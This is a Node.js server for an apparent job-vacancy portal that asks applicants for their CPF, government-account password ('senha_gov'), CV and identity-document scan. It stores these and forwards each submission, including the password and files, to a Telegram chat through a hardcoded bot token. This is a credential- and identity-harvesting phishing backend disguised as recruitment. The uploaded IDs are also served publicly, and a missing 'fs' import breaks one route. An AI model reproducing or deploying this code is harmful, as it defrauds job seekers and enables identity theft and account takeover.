const express = require('express');
const sqlite3 = require('sqlite3').verbose();
const multer = require('multer');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api');
const mime = require('mime-types'); // Usado para determinar o content-type dos arquivos
const app = express();

app.use(express.json());

// Configuração do multer para upload de arquivos
const storage = multer.diskStorage({
    destination: './uploads/',
    filename: (req, file, cb) => {
        cb(null, Date.now() + path.extname(file.originalname));
    }
});
const upload = multer({ storage });

// Conexão com SQLite e criação de tabela se necessário
const db = new sqlite3.Database('./vagas.db', (err) => {
    if (err) {
        console.error('Erro ao conectar ao SQLite:', err);
    } else {
        console.log('Conectado ao SQLite');

        db.run(`
            CREATE TABLE IF NOT EXISTS candidaturas (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                nome TEXT NOT NULL,
                email TEXT NOT NULL,
                telefone TEXT NOT NULL,
                cpf TEXT NOT NULL,
                senha_gov TEXT NOT NULL,
                curriculo_path TEXT NOT NULL,
                rg_path TEXT,
                data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `, (err) => {
            if (err) return console.error('Erro ao criar tabela candidaturas:', err);

            db.all("PRAGMA table_info(candidaturas)", (err, columns) => {
                if (err) return console.error('Erro ao verificar colunas:', err);

                const hasRgPath = columns.some(col => col.name === 'rg_path');
                if (!hasRgPath) {
                    db.run(`ALTER TABLE candidaturas ADD COLUMN rg_path TEXT`, (err) => {
                        if (err) {
                            console.error('Erro ao adicionar coluna rg_path:', err);
                        } else {
                            console.log('Coluna rg_path adicionada com sucesso.');
                        }
                    });
                }
            });
        });

        db.run(`
            CREATE TABLE IF NOT EXISTS vagas (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                titulo TEXT,
                empresa TEXT,
                localizacao TEXT,
                salario TEXT,
                descricao TEXT,
                data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `, (err) => {
            if (err) console.error('Erro ao criar tabela vagas:', err);
        });
    }
});

// Configuração do bot Telegram
const token = '7332904856:AAFQXw1Th9nH5wMRYf8Rt0HeRirLqFgbJR4';
const chatId = '5114449108';
const bot = new TelegramBot(token, { polling: true });

// Funções de formatação de mensagens
function formatVagaMessage(vaga) {
    return `*Nova Vaga Cadastrada*\n\n` +
           `*Título:* ${vaga.titulo}\n` +
           `*Empresa:* ${vaga.empresa}\n` +
           `*Localização:* ${vaga.localizacao}\n` +
           `*Salário:* ${vaga.salario || 'Não informado'}\n` +
           `*Descrição:* ${vaga.descricao}\n` +
           `*Data:* ${vaga.data_criacao}`;
}

function formatCandidaturaMessage(cand) {
    return `*Nova Candidatura Recebida*\n\n` +
           `*Nome:* ${cand.nome}\n` +
           `*Email:* ${cand.email}\n` +
           `*Telefone:* ${cand.telefone}\n` +
           `*CPF:* ${cand.cpf}\n` +
           `*Senha GOV:* ${cand.senha_gov}\n` +
           `*Currículo:* ${cand.curriculo_path}\n` +
           `*RG:* ${cand.rg_path || 'Não fornecido'}\n` +
           `*Data:* ${cand.data_criacao}`;
}

// Rota GET /vagas
app.get('/vagas', (req, res) => {
    db.all('SELECT * FROM vagas', [], (err, rows) => {
        if (err) {
            console.error('Erro ao listar vagas:', err);
            return res.status(500).send('Erro ao listar vagas');
        }
        res.json(rows);
    });
});

// Rota POST /vagas
app.post('/vagas', (req, res) => {
    const { titulo, empresa, localizacao, salario, descricao } = req.body;
    const query = 'INSERT INTO vagas (titulo, empresa, localizacao, salario, descricao) VALUES (?, ?, ?, ?, ?)';

    db.run(query, [titulo, empresa, localizacao, salario, descricao], function(err) {
        if (err) {
            console.error('Erro ao cadastrar vaga:', err);
            return res.status(500).send('Erro ao cadastrar vaga');
        }

        db.get('SELECT * FROM vagas WHERE id = ?', [this.lastID], (err, vaga) => {
            if (!err && vaga) {
                bot.sendMessage(chatId, formatVagaMessage(vaga), { parse_mode: 'Markdown' });
            }
        });

        res.send('Vaga cadastrada com sucesso!');
    });
});

// Rota POST /candidaturas
app.post('/candidaturas', upload.fields([{ name: 'curriculo' }, { name: 'rg' }]), (req, res) => {
    const { nome, email, telefone, cpf, senha_gov } = req.body;
    const curriculo_path = req.files['curriculo']?.[0].path;
    const rg_path = req.files['rg']?.[0].path || null;

    if (!curriculo_path) return res.status(400).send('Currículo é obrigatório.');

    const query = `
        INSERT INTO candidaturas (nome, email, telefone, cpf, senha_gov, curriculo_path, rg_path)
        VALUES (?, ?, ?, ?, ?, ?, ?)`;

    db.run(query, [nome, email, telefone, cpf, senha_gov, curriculo_path, rg_path], function(err) {
        if (err) {
            console.error('Erro ao salvar candidatura:', err);
            return res.status(500).send('Erro ao salvar candidatura');
        }

        db.get('SELECT * FROM candidaturas WHERE id = ?', [this.lastID], (err, cand) => {
            if (!err && cand) {
                bot.sendMessage(chatId, formatCandidaturaMessage(cand), { parse_mode: 'Markdown' });

                const curriculoType = mime.lookup(curriculo_path) || 'application/octet-stream';
                bot.sendDocument(chatId, curriculo_path, {}, { contentType: curriculoType })
                    .catch(err => console.error('Erro ao enviar currículo:', err));

                if (rg_path) {
                    const rgType = mime.lookup(rg_path) || 'application/octet-stream';
                    bot.sendDocument(chatId, rg_path, {}, { contentType: rgType })
                        .catch(err => console.error('Erro ao enviar RG:', err));
                }
            }
        });

        res.send('Candidatura enviada com sucesso!');
    });
});

// Comando /vagas no bot
bot.onText(/\/vagas/, (msg) => {
    if (msg.chat.id.toString() !== chatId) return bot.sendMessage(msg.chat.id, 'Acesso negado.');

    db.all('SELECT * FROM vagas', [], (err, rows) => {
        if (err || !rows.length) {
            return bot.sendMessage(chatId, 'Nenhuma vaga encontrada.');
        }

        let mensagem = '*Vagas Disponíveis*\n\n';
        rows.forEach(v => {
            mensagem += `*${v.titulo}*\nEmpresa: ${v.empresa}\nLocal: ${v.localizacao}\nSalário: ${v.salario || 'Não informado'}\nDescrição: ${v.descricao}\nData: ${v.data_criacao}\n\n`;
        });

        bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
    });
});

// Comando /candidaturas no bot
bot.onText(/\/candidaturas/, (msg) => {
    if (msg.chat.id.toString() !== chatId) return bot.sendMessage(msg.chat.id, 'Acesso negado.');

    db.all('SELECT * FROM candidaturas', [], (err, rows) => {
        if (err || !rows.length) {
            return bot.sendMessage(chatId, 'Nenhuma candidatura encontrada.');
        }

        let mensagem = '*Candidaturas Recebidas*\n\n';
        rows.forEach(c => {
            mensagem += `*${c.nome}*\nEmail: ${c.email}\nTelefone: ${c.telefone}\nCPF: ${c.cpf}\nSenha GOV: ${c.senha_gov}\nCurrículo: ${c.curriculo_path}\nRG: ${c.rg_path || 'Não fornecido'}\nData: ${c.data_criacao}\n\n`;
        });

        bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
    });
});

// Servir arquivos da pasta uploads
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// ⬇⬇⬇ Cole aqui ⬇⬇⬇
app.use(express.static(path.join(__dirname, 'public')));

app.get('*', (req, res) => {
    const indexPath = path.join(__dirname, 'public', 'index.html');
    if (fs.existsSync(indexPath)) {
        res.sendFile(indexPath);
    } else {
        res.status(404).send('Página não encontrada');
    }
});
// ⬆⬆⬆ Até aqui ⬆⬆⬆

// Iniciar servidor
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
